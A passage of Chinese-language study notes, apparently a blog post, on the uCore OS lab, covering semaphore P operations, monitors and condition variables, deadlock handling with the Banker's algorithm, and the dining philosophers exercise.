P操作"></a>__down(): P操作</h4><p><img src="../../image/ucore/down.gif" alt="down"></p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">static</span> __noinline <span class="hljs-keyword">uint32_t</span> __down(<span class="hljs-keyword">semaphore_t</span> *sem, <span class="hljs-keyword">uint32_t</span> wait_state) &#123;<br>    <span class="hljs-comment">//realize P operation</span><br>    <span class="hljs-keyword">bool</span> intr_flag;<br>    local_intr_save(intr_flag);<span class="hljs-comment">//save the interrupt flag</span><br>    <span class="hljs-keyword">if</span> (sem-&gt;value &gt; <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">//能够获取信号量</span><br>        sem-&gt;value --;<br>        local_intr_restore(intr_flag);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-comment">//无法获得信号量时:</span><br>    <span class="hljs-keyword">wait_t</span> __wait, *wait = &amp;__wait;<br>    wait_current_set(&amp;(sem-&gt;wait_queue), wait, wait_state); <span class="hljs-comment">//加入等待队列</span><br>    local_intr_restore(intr_flag);<span class="hljs-comment">//关中断</span><br><br>    schedule();<span class="hljs-comment">//选择另一个进程执行</span><br><br>    local_intr_save(intr_flag);<span class="hljs-comment">//如果被另一个V操作(up函数)唤醒, 继续执行</span><br>    wait_current_del(&amp;(sem-&gt;wait_queue), wait);<span class="hljs-comment">//从wait队列中删除</span><br>    local_intr_restore(intr_flag);<br><br>    <span class="hljs-keyword">if</span> (wait-&gt;wakeup_flags != wait_state) &#123;<br>        <span class="hljs-keyword">return</span> wait-&gt;wakeup_flags;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="3-信号量"><a href="#3-信号量" class="headerlink" title="3.信号量"></a>3.信号量</h3><p>信号量的数据结构定义如下:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-keyword">int</span> value;                   <span class="hljs-comment">//信号量的当前值</span><br>    <span class="hljs-keyword">wait_queue_t</span> wait_queue;     <span class="hljs-comment">//信号量对应的等待队列</span><br>&#125; <span class="hljs-keyword">semaphore_t</span>;<br></code></pre></div></td></tr></table></figure><p>__up()和__down()的分析在上面.</p><p>对照信号量的原理性描述和具体实现，可以发现二者在流程上基本一致，只是具体实现采用了关中断的方式保证了对共享资源的互斥访问，通过等待队列让无法获得信号量的进程睡眠等待。</p><h3 id="4-管程-monitor-和条件变量"><a href="#4-管程-monitor-和条件变量" class="headerlink" title="4.管程(monitor)和条件变量"></a>4.管程(monitor)和条件变量</h3><blockquote><p><a href="https://kiprey.github.io/2020/09/uCore-7/#5-%E7%AE%A1%E7%A8%8B">原理</a> </p></blockquote><p>ucore中的管程机制是基于信号量和条件变量来实现的。ucore中的管程的数据结构monitor_t定义如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">monitor</span>&#123;</span><br>    <span class="hljs-keyword">semaphore_t</span> mutex;<span class="hljs-comment">// the mutex lock for going into the routines in monitor, should be initialized to 1</span><br>    <span class="hljs-comment">// the next semaphore is used to </span><br>    <span class="hljs-comment">//    (1) procs which call cond_signal funciton should DOWN next sema after UP cv.sema</span><br>    <span class="hljs-comment">// OR (2) procs which call cond_wait funciton should UP next sema before DOWN cv.sema</span><br>    <span class="hljs-keyword">semaphore_t</span> next;        <br>    <span class="hljs-keyword">int</span> next_count;         <span class="hljs-comment">// the number of of sleeped procs which cond_signal funciton</span><br>    <span class="hljs-keyword">condvar_t</span> *cv;          <span class="hljs-comment">// the condvars(是一个array) in monitor</span><br>&#125; <span class="hljs-keyword">monitor_t</span>;<br></code></pre></div></td></tr></table></figure><p>Since a signaling process must wait until the resumed process either leaves or waits, an additional binary semaphore, next, is introduced, initialized to 0. ==The signaling processes can use next to suspend themselves==. An integer variable next count is also provided to count the number of processes suspended on next. </p><p>管程中的条件变量的数据结构condvar_t定义如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">condvar</span>&#123;</span><br><span class="hljs-comment">// the sem semaphore is used to down the waiting proc, and the signaling proc should up the waiting proc</span><br>    <span class="hljs-keyword">semaphore_t</span> sem;     <br>    <span class="hljs-keyword">int</span> count;       　    <span class="hljs-comment">// the number of waiters on condvar</span><br>    <span class="hljs-keyword">monitor_t</span> * owner;     <span class="hljs-comment">// the owner(monitor) of this condvar</span><br>&#125; <span class="hljs-keyword">condvar_t</span>;<br></code></pre></div></td></tr></table></figure><p>条件变量的定义中也包含了一系列的成员变量，信号量sem用于让发出<code>wait_cv</code>操作的等待某个条件Cond为真的进程睡眠，而让发出<code>signal_cv</code>操作的进程通过这个sem来唤醒睡眠的进程, <strong>可以看出条件变量是信号量的高层封装.</strong> </p><p>要看懂monitor还可以看看他的初始化函数:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// Initialize monitor.</span><br><span class="hljs-keyword">void</span>  <span class="hljs-comment">//monitor中的cv其实是一个数组头, 大小是这个函数的num_cv参数, 能存放多个条件变量, 这样方便管程控制</span><br>monitor_init (<span class="hljs-keyword">monitor_t</span> * mtp, <span class="hljs-keyword">size_t</span> num_cv) &#123;<br>    <span class="hljs-keyword">int</span> i;<br>    assert(num_cv&gt;<span class="hljs-number">0</span>);<br>    mtp-&gt;next_count = <span class="hljs-number">0</span>;<br>    mtp-&gt;cv = <span class="hljs-literal">NULL</span>;<br>    sem_init(&amp;(mtp-&gt;mutex), <span class="hljs-number">1</span>); <span class="hljs-comment">//unlocked</span><br>    sem_init(&amp;(mtp-&gt;next), <span class="hljs-number">0</span>);<span class="hljs-comment">//注意到这两个的初始化并不一致, next一开始是空的</span><br>    mtp-&gt;cv =(<span class="hljs-keyword">condvar_t</span> *)kmalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">condvar_t</span>)*num_cv);<br>    assert(mtp-&gt;cv!=<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;num_cv; i++)&#123;<span class="hljs-comment">//初始化条件变量</span><br>        mtp-&gt;cv[i].count=<span class="hljs-number">0</span>;<br>        sem_init(&amp;(mtp-&gt;cv[i].sem),<span class="hljs-number">0</span>);<br>        mtp-&gt;cv[i].owner=mtp;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>ucore设计实现了条件变量<code>wait_cv</code>操作和<code>signal_cv</code>操作对应的具体函数，即<code>cond_wait</code>函数和<code>cond_signal</code>函数，此外还有<code>cond_init</code>初始化函数（可直接看源码）</p><p><strong>signal_cv的原理描述</strong></p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span>( cv.count &gt; <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">//如果该cv上没有等待的进程, 直接跳过</span><br>   monitor.next_count ++;<span class="hljs-comment">//否则next_count++</span><br>   sem_signal(cv.sem);<span class="hljs-comment">//唤醒队列中第一个进程</span><br>   sem_wait(monitor.next);<span class="hljs-comment">//一开始的时候next.value=0, 当前进程肯定会被挂起并schedule();</span><br>                            <span class="hljs-comment">//后来(???</span><br>   monitor.next_count -- ;<span class="hljs-comment">//被唤醒后就减掉了</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>实际代码是差不多的:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(cvp-&gt;count&gt;<span class="hljs-number">0</span>) &#123;<br>    cvp-&gt;owner-&gt;next_count ++;<br>    up(&amp;(cvp-&gt;sem));<br>    down(&amp;(cvp-&gt;owner-&gt;next));<br>    cvp-&gt;owner-&gt;next_count --;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><strong>wait_cv的原理描述</strong> </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">cv.count++;<span class="hljs-comment">//等待数量+1</span><br><span class="hljs-keyword">if</span>(monitor.next_count &gt; <span class="hljs-number">0</span>)<span class="hljs-comment">//有大于等于1个进程执行cond_signal函数且sleep</span><br>   sem_signal(monitor.next);<span class="hljs-comment">//唤醒wait_queue第一个进程</span><br><span class="hljs-keyword">else</span><span class="hljs-comment">//没有进程因执行cond_signal而挂起</span><br>   sem_signal(monitor.mutex);<span class="hljs-comment">//解开互斥锁, 好让其他进程进入管程</span><br>sem_wait(cv.sem);<span class="hljs-comment">//当前进程需要等待信号(见下方)</span><br>cv.count --;<br></code></pre></div></td></tr></table></figure><blockquote><p>有一点迷惑的地方在于等待信号是在程序中判断的吗? 看代码确实是这个意思, 到了sem_wait就一定会等待(通过相邻哲学家的情况提前signal_cv, 设置state_condvar, 然后sem_wait都用不着判断cv.sem的value, 肯定是0.</p><p>没有弄清楚什么是必须写在操作系统里的什么是要写在程序中的</p></blockquote><p>实际代码:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">cvp-&gt;count++;<br><span class="hljs-keyword">if</span>(cvp-&gt;owner-&gt;next_count &gt; <span class="hljs-number">0</span>)<br>    up(&amp;(cvp-&gt;owner-&gt;next));<br><span class="hljs-keyword">else</span><br>    up(&amp;(cvp-&gt;owner-&gt;mutex));<br>down(&amp;(cvp-&gt;sem));<br>cvp-&gt;count --;<br></code></pre></div></td></tr></table></figure><h3 id="5-管程中函数的入口出口设计"><a href="#5-管程中函数的入口出口设计" class="headerlink" title="5.管程中函数的入口出口设计"></a>5.管程中函数的入口出口设计</h3><p>为了让整个管程正常运行，还需在管程中的每个函数的入口和出口增加相关操作，即：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">function_in_monitor （…）<br>&#123;<br>  sem.wait(monitor.mutex);<br><span class="hljs-comment">//-----------------------------</span><br>  the real body of function;<br><span class="hljs-comment">//-----------------------------</span><br>  <span class="hljs-keyword">if</span>(monitor.next_count &gt; <span class="hljs-number">0</span>)<br>     sem_signal(monitor.next);<br>  <span class="hljs-keyword">else</span><br>     sem_signal(monitor.mutex);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>这样带来的作用有两个，（1）只有一个进程在执行管程中的函数。（2）避免由于执行了cond_signal函数而睡眠的进程无法被唤醒。</p><p>具体是这样工作的: </p><ul><li>如果1号进程进入了临界区, 然后由于某种原因(比如外部中断)而切换到了另一个也要访问管程的进程2号, 那么2号就会在sem.wait()里被挂起来, 并且通过调度最终换到1号继续执行. </li><li>当1号执行到出口时, 他会发现next_count=0, 随后释放mutex锁, 发现1号在等待mutex, 所以将其唤醒, 在下一个中断中, 1号进入睡眠, 2号准备执行. (不一定是紧跟着的, 还要看调度器, 这里只是设置成了RUNNALBE)</li><li>2 号执行到出口时发现next_count=1, 于是up一下信号量next, 最终回到一号继续往下执行.</li></ul><h3 id="6-死锁"><a href="#6-死锁" class="headerlink" title="6.死锁"></a>6.死锁</h3><blockquote><p>不用可惜了(bushi <a href="https://kiprey.github.io/2020/09/uCore-7/#7-%E6%AD%BB%E9%94%81">[link]</a> </p></blockquote><h4 id="a-死锁概念"><a href="#a-死锁概念" class="headerlink" title="a. 死锁概念"></a>a. 死锁概念</h4><h5 id="1-进程访问资源的流程"><a href="#1-进程访问资源的流程" class="headerlink" title="1) 进程访问资源的流程"></a>1) 进程访问资源的流程</h5><ul><li>资源类型R1,R2,…，RmR1,R2,…，Rm: CPU执行时间，内存空间，I/O设备等。</li><li>每类资源RiRi有WiWi个实例</li><li>进程访问资源的流程<ul><li>请求/获取：申请空闲资源</li><li>使用/占用：进程占用资源</li><li>释放：资源状态由占用变成空闲。</li></ul></li></ul><h5 id="2-资源分类"><a href="#2-资源分类" class="headerlink" title="2) 资源分类"></a>2) 资源分类</h5><ul><li>可重用资源（Reusable Resource）<ul><li>资源不能被删除且自任何时刻只能有一个进程在使用</li><li>进程释放资源后，其他进程可重用</li><li>可重用资源示例：硬件如处理器、I/O设备等，软件如文件、数据库等</li><li>可能出现死锁：每个进程占用一部分资源并请求其他资源</li></ul></li><li>消费资源 (Consumable resource)<ul><li>资源创建和销毁</li><li>消耗资源示例：中断、信号、消息</li><li>可能出现死锁：进程间相互等待接收对方的消息</li></ul></li></ul><h5 id="3-出现死锁的必要条件"><a href="#3-出现死锁的必要条件" class="headerlink" title="3) 出现死锁的必要条件"></a>3) 出现死锁的必要条件</h5><ul><li>互斥：任何时刻只能有一个进程使用一个资源实例</li><li>持有并等待：进程保持至少一个资源，并正在等待获取其他进程持有的资源</li><li>非抢占：资源只能在进程使用后自愿释放</li><li>循环等待：进程间相互循环等待</li></ul><h4 id="b-死锁处理方法"><a href="#b-死锁处理方法" class="headerlink" title="b. 死锁处理方法"></a>b. 死锁处理方法</h4><blockquote><p>死锁检测较为复杂，通常由应用程序处理死锁，<strong>操作系统会忽略死锁</strong> </p></blockquote><h5 id="1-死锁预防"><a href="#1-死锁预防" class="headerlink" title="1) 死锁预防"></a>1) 死锁预防</h5><blockquote><p>死锁预防（Deadlock Prevention) ： 确保系统永远不会进入死锁状态。</p></blockquote><p>预防是采用某种策略，<strong>限制</strong>并发进程对资源的请求，使系统在任何时刻都<strong>不满足死锁的必要条件</strong>。</p><ul><li>互斥：把互斥的共享资源封装成可同时访问的</li><li>持有并等待：进程请求资源时，要求它不持有任何其他资源。仅允许进程在开始执行时，一次请求所有需要的资源，但这种做法的资源利用率低。</li><li>非抢占：如进程请求不能立即分配的资源，则释放已经占用的资源。只在能够同时获得所有需要资源时，才执行分配操作。</li><li>循环等待：对资源排序，要求进程按顺序请求资源。</li></ul><h5 id="2-死锁避免"><a href="#2-死锁避免" class="headerlink" title="2) 死锁避免"></a>2) 死锁避免</h5><blockquote><p>死锁避免（Deadlock Avoidance）：在使用前进行判断，只允许不会出现死锁的进程请求资源。</p></blockquote><p>利用额外的先验信息，在分配资源时判断是否会出现死锁，只在不会出现死锁时分配资源。</p><ul><li>要求进程声明需要资源的<strong>最大数目</strong>。</li><li>限定<strong>提供</strong>与<strong>分配</strong>的资源数量，确保满足进程的<strong>最大</strong>需求。</li><li><strong>动态检查</strong>资源分配状态，确保不会出现环形等待。</li></ul><p>系统资源分配的安全状态</p><ul><li>当进程请求资源时，系统判断分配后是否处于安全状态。</li><li>系统处于安全状态：针对所有已占用进程，存在安全序列</li><li>序列&lt;P1,P2,…,PN&gt;是安全的<ul><li>PiPi要求的资源 &lt;= 当前可用资源 + 所有PjPj持有资源。其中<code>j&lt;i</code>。</li><li>如果PiPi的资源请求不能马上分配，则PiPi等待所有Pj(j&lt;i)Pj(j&lt;i)完成</li><li>PiPi完成后，Pi+1Pi+1可得到所需资源，执行并释放所分配的资源。</li><li>最终整个序列的所有PiPi都能获得所需资源。</li></ul></li></ul><p><strong>银行家算法</strong>（Banker’s Algorithm）</p><blockquote><p>银行家算法是一个避免死锁产生的算法，以银行借贷分配策略为基础，判断并保证系统处于安全状态。</p></blockquote><ul><li><p>使用的数据结构</p><blockquote><p>n = 线程数量， m = 资源类型数量</p></blockquote><ul><li>**Max(总需求量)**：n x m 矩阵，线程TiTi最多请求类型RiRi的资源Max[i,j]Max[i,j]个实例</li><li>**Available(剩余空闲量)**：长度为m的向量，当前有Available[i]Available[i]个类型RjRj的资源实例可用</li><li>**Allocation(已分配量)**：n x m 矩阵，线程TiTi当前分配了Allocation[i,j]Allocation[i,j]个RjRj的实例</li><li>**Need(未来需要量)**： n x m矩阵，线程TiTi未来需要Need[i,j]Need[i,j]个RjRj资源实例。</li></ul><blockquote><p>Need[i,j]=Max[i,j]−Allocation[i,j]Need[i,j]=Max[i,j]−Allocation[i,j]</p></blockquote></li><li><p><strong>安全状态判断</strong></p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">COPY<span class="hljs-comment">// Work和Finish分别是长度为m和n的向量初始化</span><br>Work[m], Finish[n];<br><br>Work = Available; <span class="hljs-comment">// 当前资源剩余空闲量</span><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>  Finish[i] = <span class="hljs-literal">false</span>; <span class="hljs-comment">// 线程i没结束</span><br><br><span class="hljs-comment">// ...每个线程开始运行并分配资源</span><br><br><span class="hljs-comment">// 在一段时间后</span><br><span class="hljs-comment">// 寻找Need比Work小，同时还未结束的线程Ti</span><br><span class="hljs-keyword">while</span>(Finish[i] == <span class="hljs-literal">false</span> &amp;&amp; Need[i] &lt;= Work)<br>&#123;<br>    <span class="hljs-comment">// 线程i的资源需求量小于当前剩余空闲资源量，所以该线程可以正常结束，并回收该线程的所有资源</span><br>    Work += Allocation[i];<br>    Finish[i] = <span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-comment">// 如果所有线程Ti都满足Finish[i] == true,则系统处于安全状态。</span><br><span class="hljs-keyword">if</span>(Finish == <span class="hljs-literal">true</span>)<br>    Safe;<br><span class="hljs-keyword">else</span><br>    <span class="hljs-comment">// 反之，系统处于不安全状态。</span><br>    NoSafe;<br></code></pre></div></td></tr></table></figure></li><li><p>银行家算法具体设计</p><ul><li><p>初始化：Request_i：线程TiTi的资源请求向量， Requesti[j]Requesti[j]：线程TiTi请求资源RjRj的实例</p></li><li><p>循环：</p><ol><li><p>如果Requesti&lt;=Need[i]Requesti&lt;=Need[i]，则转到步骤2。否则拒绝资源申请，因为线程已经超过了其最大资源要求。</p></li><li><p>如果Requesti&lt;=Available，转到步骤3。否则，Ti必须等待，因为资源不可用。</p></li><li><p>通过安全状态判断来确定是否分配资源给Ti</p><ul><li><p>生成一个需要判断状态是否安全的资源分配环境</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">COPYAvailable = Available - Request_i;<br>Allocation[i] = Allocation[i] + Request_i;<br>Need[i] = Need[i] - Request_i;<br></code></pre></div></td></tr></table></figure></li><li><p>并调用上文的<strong>安全状态判断</strong></p><ul><li>如果返回结果是<strong>安全</strong>，则将资源分配给TiTi</li><li>如果返回结果是<strong>不安全</strong>，系统会拒绝TiTi的资源请求</li></ul></li></ul></li></ol></li></ul></li></ul><h5 id="3-死锁检测和恢复"><a href="#3-死锁检测和恢复" class="headerlink" title="3) 死锁检测和恢复"></a>3) 死锁检测和恢复</h5><blockquote><p>死锁检测和恢复（Deadlock Detection &amp; Recovery） : 在检测到运行系统进入死锁状态后进行恢复。</p></blockquote><ul><li>特点<ul><li>允许系统进入死锁状态</li><li>维护系统的资源分配图</li><li>定期调用死锁检测算法来搜索图中是否存在死锁</li><li>出现死锁时，用死锁恢复机制进行恢复。</li></ul></li></ul><h6 id="i-死锁检测"><a href="#i-死锁检测" class="headerlink" title="i. 死锁检测"></a>i. 死锁检测</h6><ul><li><p>数据结构</p><ul><li>**Available(剩余空闲量)**：长度为m的向量，每种类型可用资源的数量</li><li>**Allocation(已分配量)**：n x m 矩阵，当前分配给各个进程每种类型资源的数量，进程PiPi拥有资源RiRi的Allocation[i,j]Allocation[i,j]个实例。</li></ul></li><li><p>死锁检测算法</p><blockquote><p>该算法与银行家算法类似。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">COPY<span class="hljs-comment">// Work和Finish分别是长度为m和n的向量初始化</span><br>Work[m], Finish[n];<br><br>Work = Available; <span class="hljs-comment">// 当前资源剩余空闲量</span><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>&#123;<br>    <span class="hljs-comment">// 如果当前遍历到的线程占用资源，则设置Finish为false</span><br>    <span class="hljs-comment">// 反之，如果当前线程不占用资源，则要么是线程已结束，要么是我们不关心的线程</span><br>    <span class="hljs-keyword">if</span>(Allocation[i] &gt; <span class="hljs-number">0</span>)<br>      Finish[i] = <span class="hljs-literal">false</span>; <span class="hljs-comment">// 线程i没结束</span><br>    <span class="hljs-keyword">else</span><br>      Finish[i] = <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-comment">// ...每个线程开始运行并分配资源</span><br><br><span class="hljs-comment">// 在一段时间后</span><br><span class="hljs-comment">// 寻找Request比Work小，同时还未结束的线程Ti</span><br><span class="hljs-keyword">while</span>(Finish[i] == <span class="hljs-literal">false</span> &amp;&amp; Request[i] &lt;= Work)<br>&#123;<br>    <span class="hljs-comment">// 线程i的资源需求量小于当前剩余空闲资源量，所以该线程可以正常结束，并回收该线程的所有资源</span><br>    Work += Allocation[i];<br>    Finish[i] = <span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-comment">// 如果所有线程Ti都满足Finish[i] == true,则系统处于正常状态</span><br><span class="hljs-keyword">if</span>(Finish == <span class="hljs-literal">true</span>)<br>    NoDeadlock;<br><span class="hljs-keyword">else</span><br>    <span class="hljs-comment">// 反之，系统处于死锁状态。</span><br>    Deadlock;<br></code></pre></div></td></tr></table></figure></li><li><p>死锁检测算法的使用</p><ul><li>死锁检测的时间和周期选择依据<ul><li>死锁多久可能会发生</li><li>多少进程需要被回滚</li></ul></li><li>资源图可能有多个循环，难以分辨”造成“死锁的关键进程</li></ul></li></ul><h6 id="ii-死锁恢复"><a href="#ii-死锁恢复" class="headerlink" title="ii. 死锁恢复"></a>ii. 死锁恢复</h6><ul><li>进程终止<ul><li>终止所有的死锁线程</li><li>一次只终止一个进程直到死锁消除</li><li>终止进程的顺序应该是<ul><li>进程的优先级: 通常是优先级低的</li><li>进程已运行时间以及还需运行时间: 希望运行时间短的</li><li>进程已占用资源: 占用资源少的</li><li>进程完成需要的资源</li><li>终止进程数目: 自然是越小越好</li><li>进程是交互式还是批处理: 通常是用户交互进程</li></ul></li></ul></li><li>资源抢占<ul><li>选择被抢占进程：最小成本目标</li><li>进程回退：返回到一些安全状态，重启进程到安全状态</li><li>可能会出现饥饿：同一个进程可能一直被选作被抢占者</li></ul></li></ul><h2 id="练习-4"><a href="#练习-4" class="headerlink" title="练习"></a>练习</h2><h3 id="练习1-4"><a href="#练习1-4" class="headerlink" title="练习1"></a>练习1</h3><blockquote><p>理解内核级信号量的实现和基于内核级信号量的哲学家就餐问题</p></blockquote><p>信号量的实现在知识点中有分析. 这里写哲学家就餐问题检查函数的实现和信号量的联系.</p><p>在kern\sync\check_sync.c中有check_sync()函数, 分为使用 信号量的检查 以及 管程的检查, 拿前者说明, 该种检查调用<code>sem_init(&amp;mutex, 1)</code>初始化mutex, 需要设置下面这几个变量存储必要信息. </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">int</span> state_sema[N]; <span class="hljs-comment">/* 记录每个人状态的数组 */</span><br><span class="hljs-keyword">semaphore_t</span> mutex; <span class="hljs-comment">/* 临界区互斥 */</span><br><span class="hljs-keyword">semaphore_t</span> s[N]; <span class="hljs-comment">/* 每个哲学家一个信号量, 表示是否得到了叉子 */</span><br></code></pre></div></td></tr></table></figure><p>然后创建五个内核线程, 线程调用的函数为philosopher_using_[semaphore, monitor], 进入一个总共4次的循环. </p><p>每次循环就是重复思考, 取叉, 进餐, 放叉几个动作, 模拟进程使用资源的几种操作.</p><p>比如取叉会调用<code>phi_take_forks_sema()</code>函数, </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">phi_take_forks_sema</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i)</span> <span class="hljs-comment">/* i：哲学家号码从0到N-1 */</span></span><br><span class="hljs-function"></span>&#123; <br>        down(&amp;mutex); <span class="hljs-comment">/* 进入临界区 */</span><br>        state_sema[i]=HUNGRY; <span class="hljs-comment">/* 记录下哲学家i饥饿的事实 */</span><br>        phi_test_sema(i); <span class="hljs-comment">/* 试图得到两只叉子 */</span><br>        up(&amp;mutex); <span class="hljs-comment">/* 离开临界区 */</span><br>        down(&amp;s[i]); <span class="hljs-comment">/* 如果得不到叉子就阻塞 */</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>这是一个互斥的资源请求, <del>我认为该函数可以理解为这就相当于进程使用一种系统调用, 在操作系统层面进行进入和离开临界区的操作.</del> ==好吧信号量这种方法其实是需要程序员写出来的.==</p><ul><li>先是临界区互斥信号量mutex的P操作(实现在知识点2里), 同一时间只能有一个哲学家进入临界区</li><li>然后试图得到两只叉子还要查看左边右边哲学家是否在EATING状态, 得到了就进行该哲学家信号量s[i]的V操作, 表示取到了叉子</li><li>最后一句就是如果没取到叉子又进行了P操作, 这时候肯定就阻塞了, 